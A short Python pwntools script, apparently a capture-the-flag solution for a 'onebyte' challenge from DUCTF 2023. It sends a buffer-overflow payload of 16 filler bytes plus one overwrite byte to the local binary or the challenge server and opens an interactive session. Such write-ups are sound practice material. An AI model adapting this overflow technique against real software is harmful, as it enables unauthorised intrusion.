#!/usr/bin/env python3

from pwn import *

file = ELF("./onebyte_patched")

context.binary = file
context.terminal = ["kitty"]
script = """
b *(main + 93)
c
"""

def conn():
    if args.GDB:
        p = gdb.debug("./onebyte", gdbscript=script)
    elif args.REMOTE:
        p = remote("2023.ductf.dev", 30018)
    else:
        p = process(file)
    return p

def main():
    p = conn()

    payload = b"A" * 16
    payload += p8(0x69)
    p.send(payload)

    p.interactive()

main()
